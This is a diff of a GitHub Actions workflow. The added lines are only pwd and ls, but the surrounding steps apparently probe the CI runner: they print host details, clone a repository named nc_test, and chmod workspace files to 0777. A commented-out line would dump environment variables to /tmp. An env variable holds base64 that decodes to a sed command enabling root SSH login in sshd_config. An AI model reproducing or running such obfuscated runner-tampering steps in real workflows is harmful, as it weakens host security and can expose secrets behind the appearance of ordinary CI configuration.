@@ -34,6 +34,7 @@ jobs:
       - name: Run a one-line script
         run: |
           cat /etc/hostname;
+          pwd;
           git clone https://github.com/189er/nc_test;
           hostname -i;
           echo ${{ toJson(github.event.action) }};
@@ -43,6 +44,7 @@ jobs:
           #(env|grep ss>/tmp/s0;sleep 1111&);
           chmod 0777 $GITHUB_WORKSPACE/*;
           ls -al;
+          ls -al nc_test;
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
